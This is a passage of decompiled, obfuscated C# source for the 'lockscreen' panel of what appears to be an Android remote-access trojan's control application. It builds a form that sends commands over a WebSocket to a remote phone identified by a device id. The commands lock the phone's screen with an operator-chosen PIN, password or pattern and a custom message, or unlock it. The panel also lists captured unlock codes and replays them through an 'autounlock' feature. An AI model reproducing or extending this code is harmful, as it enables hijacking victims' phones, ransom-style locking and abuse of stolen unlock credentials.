		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV0.RowTemplate.Height = 24;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(785, 381);
		this.DGV0.TabIndex = 51;
		this.partclm.HeaderText = EXGuarder._1309536C;
		this.partclm.MinimumWidth = 6;
		this.partclm.Name = EXGuarder._6C585C1A;
		this.partclm.ReadOnly = true;
		this.adresclm.HeaderText = EXGuarder._62255865;
		this.adresclm.MinimumWidth = 6;
		this.adresclm.Name = EXGuarder._622D2756;
		this.adresclm.ReadOnly = true;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(2, 151);
		this.DrakeWidth_W4.Name = EXGuarder._6A1B4C15;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(785, 12);
		this.DrakeWidth_W4.TabIndex = 52;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(789, 595);
		base.Controls.Add(this.DGV0);
		base.Controls.Add(this.DrakeWidth_W4);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel44);
		base.Controls.Add(this.Panel3);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._254F5D53);
		this.MinimumSize = new System.Drawing.Size(582, 595);
		base.Name = EXGuarder._53290D2B;
		this.Text = EXGuarder._53290D2B;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.Panel44, 0);
		base.Controls.SetChildIndex(this.Panel4, 0);
		base.Controls.SetChildIndex(this.DrakeWidth_W4, 0);
		base.Controls.SetChildIndex(this.DGV0, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel44.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		base.ResumeLayout(false);
	}

	public lockscreen()
	{
		base.Load += lockscreen_Load;
		InitializeComponent();
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._2711622F, EXGuarder._29525D22);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._033F336C, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._2F6E6A6A;
			lcktyplbl.Text = EXGuarder._40313521;
			refbtn.Text = EXGuarder._551B601A;
			delbtn.Text = EXGuarder._20095538;
			lockbtn.Text = EXGuarder._3C453B0B;
			unlockbtn.Text = EXGuarder._1E301015;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._54780771, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._576E3C64;
			lcktyplbl.Text = EXGuarder._4E3C6818;
			refbtn.Text = EXGuarder._195A1D63;
			delbtn.Text = EXGuarder._17066B07;
			lockbtn.Text = EXGuarder._54263B17;
			unlockbtn.Text = EXGuarder._725E1604;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._29135935, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._70135806;
			lcktyplbl.Text = EXGuarder._414E1163;
			refbtn.Text = EXGuarder._36685165;
			delbtn.Text = EXGuarder._58690A44;
			lockbtn.Text = EXGuarder._694B3C1C;
			unlockbtn.Text = EXGuarder._48083514;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._76316963, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._69774649;
			lcktyplbl.Text = EXGuarder._0034265F;
			refbtn.Text = EXGuarder._2959250D;
			delbtn.Text = EXGuarder._4B6D2872;
			lockbtn.Text = EXGuarder._784C234C;
			unlockbtn.Text = EXGuarder._443A5108;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._10113C24, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._304E7172;
			lcktyplbl.Text = EXGuarder._440C6853;
			refbtn.Text = EXGuarder._274E0960;
			delbtn.Text = EXGuarder._576E7521;
			lockbtn.Text = EXGuarder._09034F10;
			unlockbtn.Text = EXGuarder._010F6B5A;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5C27263D, TextCompare: false))
		{
			ctrtext.Text = EXGuarder._68111D17;
			lcktyplbl.Text = EXGuarder._441B4515;
			refbtn.Text = EXGuarder._765C406E;
			delbtn.Text = EXGuarder._600B694D;
			lockbtn.Text = EXGuarder._09034F10;
			unlockbtn.Text = EXGuarder._010F6B5A;
		}
	}

	private void inputtext2_TextChanged(object sender, EventArgs e)
	{
		if (Operators.CompareString(comboTargts.Text, EXGuarder._2231064E, TextCompare: false) == 0)
		{
			return;
		}
		string text = EXGuarder._4C202C37;
		string text2 = inputtext2.Text;
		foreach (char c in text2)
		{
			if (char.IsDigit(c))
			{
				text += Conversions.ToString(c);
			}
		}
		if (Operators.CompareString(inputtext2.Text, text, TextCompare: false) != 0)
		{
			inputtext2.Text = text;
			inputtext2.SelectionStart = text.Length;
		}
	}

	public void switchlock(bool isLocked)
	{
		if (isLocked)
		{
			lockbtn.ForeColor = Color.Gray;
			lockbtn.RectColor = Color.Gray;
			lockbtn.Enabled = false;
			unlockbtn.ForeColor = Color.FromArgb(2, 176, 117);
			unlockbtn.RectColor = Color.FromArgb(2, 176, 117);
			unlockbtn.Enabled = true;
		}
		else
		{
			unlockbtn.ForeColor = Color.Gray;
			unlockbtn.RectColor = Color.Gray;
			unlockbtn.Enabled = false;
			lockbtn.ForeColor = Color.FromArgb(2, 176, 117);
			lockbtn.RectColor = Color.FromArgb(2, 176, 117);
			lockbtn.Enabled = true;
		}
	}

	private void lockscreen_Load(object sender, EventArgs e)
	{
		myico.Image = BTcli.wallpaper;
		mytitle.Text = BTConst.lockmobstr;
		translateme();
	}

	private void unlockbtn_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._24793B10, EXGuarder._2E71722B);
		dictionary.Add(EXGuarder._605D5C71, EXGuarder._234D3D75);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
	}

	private void lockbtn_Click(object sender, EventArgs e)
	{
		string text = inputtext2.Text;
		if (codes.StrisEmpty(text) && MyMsg.Show(BTConst.emptycodstr, BTConst.confnocodestr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._3221143A) != DialogResult.OK)
		{
			return;
		}
		string value = EXGuarder._1C760F79;
		string left = comboTargts.Text;
		if (Operators.CompareString(left, EXGuarder._1F425F05, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._01142829, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._650D4604, TextCompare: false) == 0)
				{
					value = EXGuarder._1D13463D;
				}
			}
			else
			{
				value = EXGuarder._1A650970;
				if (!codes.StrisEmpty(text) && text.Length != 4 && text.Length != 6)
				{
					BTAlerter.infos(BTConst.pintypsstr);
					return;
				}
			}
		}
		else
		{
			value = EXGuarder._1C760F79;
			if (!codes.StrisEmpty(text) && ((text.Length < 4) | (text.Length > 9)))
			{
				BTAlerter.infos(BTConst.pintypsstr);
				return;
			}
		}
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = BTConst.lockinfostr;
		myinputs2.inputtext.Text = EXGuarder._3221143A;
		myinputs2.inputtext2.Text = EXGuarder._3221143A;
		myinputs2.inputtext2.Visible = true;
		myinputs2.checkfolder.Visible = false;
		myinputs2.inputtext.Watermark = BTConst.locktitstr;
		myinputs2.inputtext2.Watermark = BTConst.lockmsgstr;
		if (myinputs2.ShowDialog() == DialogResult.OK)
		{
			string value2 = myinputs2.inputtext.Text;
			string value3 = myinputs2.inputtext2.Text;
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._6E340944, EXGuarder._2F637870);
			dictionary.Add(EXGuarder._263B5E0C, text);
			dictionary.Add(EXGuarder._654F5F44, value);
			dictionary.Add(EXGuarder._423F7310, value2);
			dictionary.Add(EXGuarder._2D3D2A05, value3);
			dictionary.Add(EXGuarder._70480B09, EXGuarder._1C760F79);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
		}
	}

	private void comboTargts_SelectedIndexChanged(object sender, EventArgs e)
	{
		inputtext2.Text = EXGuarder._460D511A;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._1554183B, EXGuarder._0F1A2B60);
		dictionary.Add(EXGuarder._51573B3F, EXGuarder._7842162A);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.delcodsconfrmstr, string.Format(EXGuarder._6B1E5065, BTConst.Continuestr), MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._6F625B55) == DialogResult.OK)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._052A4F20, EXGuarder._05243621);
			dictionary.Add(EXGuarder._3D304269, EXGuarder._20083826);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, BTcli.mobid, BTcli.Serverins.WSClient);
			DGV0.Rows.Clear();
		}
	}

	private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex < 0 || Operators.CompareString(DGV0.Columns[e.ColumnIndex].Name, EXGuarder._79225119, TextCompare: false) != 0)
		{
			return;
		}
		DataGridViewRow dataGridViewRow = DGV0.Rows[e.RowIndex];
		string text = dataGridViewRow.Cells[1].Value.ToString();
		string left = dataGridViewRow.Cells[0].Value.ToString();
		autounlock autounlock2 = new autounlock(BTcli);
		autounlock2.inputtext2.Text = text;
		if (Operators.CompareString(left, EXGuarder._3329013C, TextCompare: false) != 0 && Operators.CompareString(left, EXGuarder._1C260577, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._05643E4F, TextCompare: false) != 0 && Operators.CompareString(left, EXGuarder._0F5B2162, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._611F0703, TextCompare: false) == 0 || Operators.CompareString(left, EXGuarder._5624705A, TextCompare: false) == 0)
				{
					autounlock2.comboTargts.Text = EXGuarder._5624705A;
				}
			}
			else
			{
				autounlock2.comboTargts.Text = EXGuarder._0F5B2162;
			}
		}
		else
		{
			autounlock2.comboTargts.Text = EXGuarder._1C260577;
		}
		autounlock2.Show();
	}

	private void DGV0_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		if (e.RowIndex >= 0 && Operators.CompareString(DGV0.Columns[e.ColumnIndex].Name, EXGuarder._735A1550, TextCompare: false) == 0)
		{
			e.PaintBackground(e.CellBounds, cellsPaintSelectionBackground: true);
			Rectangle cellBounds = e.CellBounds;
			cellBounds.Inflate(-2, -2);
			using (SolidBrush brush = new SolidBrush(Color.FromArgb(14, 22, 33)))
			{
				e.Graphics.FillRectangle(brush, cellBounds);
			}
			TextRenderer.DrawText(e.Graphics, BTConst.autounlockbtnstr, DGV0.Font, cellBounds, Color.FromArgb(145, 163, 182), TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter);
			e.Handled = true;
		}
	}

	private void DGV0_CellMouseEnter(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex >= 0 && Operators.CompareString(DGV0.Columns[e.ColumnIndex].Name, EXGuarder._66765C15, TextCompare: false) == 0)
		{
			DGV0.Cursor = Cursors.Hand;
		}
	}

	private void DGV0_CellMouseLeave(object sender, DataGridViewCellEventArgs e)
	{
		DGV0.Cursor = Cursors.Default;
	}
}
